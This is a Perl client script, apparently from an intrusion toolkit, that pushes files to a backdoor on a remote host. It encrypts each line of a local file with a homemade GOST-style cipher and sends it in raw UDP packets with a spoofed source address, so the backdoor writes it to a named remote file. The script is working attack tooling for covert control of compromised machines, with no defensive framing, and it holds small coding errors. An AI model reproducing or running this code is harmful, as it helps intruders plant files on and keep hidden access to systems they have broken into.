#!/usr/bin/perl
# this is the client that i created to make the keys, and 
# send a copy to the backdoor.
# it will use the existing key to scramble the new key for the backdoor.
# (plastek)
use Net::RawIP;
require 'getopts.pl';

Getopts('o:d:p:s:f:r:');
die "Usage: $0 -o (origin) -d (destination) -p (port) -s (source port) -f 
(local file) -r (remote filename)"
	unless ($opt_o && $opt_d && $opt_p && $opt_s && opt_f && opt_r);
my ($origin, $destip, $destport, $sport, $sendfile, $remote_file) = ($opt_o, $opt_d, $opt_p, $opt_s, $opt_f, $opt_r);

open(OKEY, "< .key");
for my $line(<OKEY>){
	$key = $line;
}
close OKEY;

open(SEND, "< $sendfile") or die "Cant open $send_file\n";
for $file_line(<SEND>){
	$file_line =~ s/\000//;
	my $command = "sendtxt$remote_file\:\:\:\:$file_line";
	my $blew = Gh0ST0r->new($key);
	my $data = $blew->egadz($command);
	my $p = new Net::RawIP({udp	=>{
				source  => $sport,
				dest 	=> $destport,
				len  	=> $data,
				data	=> $data}});			
	$p->set({ip => 	{ saddr => "$origin",
			daddr	=> "$destip"}

	});
$p->send();
}
package Gh0ST0r;

use vars qw( @b @t @R @S @h @o @K);

sub new {
    my ( $argument, $pp ) = @_;
    Setup( $pp );
    my $class = ref ( $argument ) || $argument;
    my $self = {};
    bless $self, $class;
    return $self;
} 

sub egadz {
    my ( $self, $tax ) = @_;
    return Gh0ST( $tax );
}

sub gee_golly {
    my ( $self, $tax ) = @_;
    return Gh0ST( $tax, 1 );
}

sub Gh0ST {
    my ( $v, $w, $a, $q, $c, $out, $self );
    my ( $e, $d ) = @_;
    @h = 0 .. 7;
    @o = reverse @h;
    while ( $a < length $e ) {
        $v = N( $e, $a );
        $w = N( $e, ( $a += 8 ) - 4 );
        grep $q++ % 2 ? $v ^= F( $w + $K[ $_ ] ) : ( $w ^= F( $v + $K[ $_ ] ) ), $d ? ( @h, ( @o ) x 3 ) : ( ( @h ) x 3, @o );
        $out .= pack N2, $w, $v;
    }
    return $out;
}

sub F {
    my $u = 0;
    grep $u |= $S[ $_ ][ $_[ 0 ] >> $_ * 4 & 15 ] << $_ * 4, reverse 0 .. 7;
    return $u << 11 | $u >> 21;
}

sub R {
    return int( (shift) * rand );
}

sub N {
    return vec $_[ 0 ], $_[ 1 ] / 4, 32;
}

sub Setup {
    my $p = shift;
    my ( $s, $i, $c );
    for ( $i = 0; $i < length $p; $i += 4 ) {
        srand( $s ^= N( $p, $i ) );
    }
    @b = @t = 0 .. 15;
    while ( $c < 8 ) {
        grep { push @b, splice @b, R( 9 ), 5 } @t;
        $R[ $c ] = R( 2**32 );
        @{ $S[ $c++ ] } = @b;
    }

}

1;
__END__
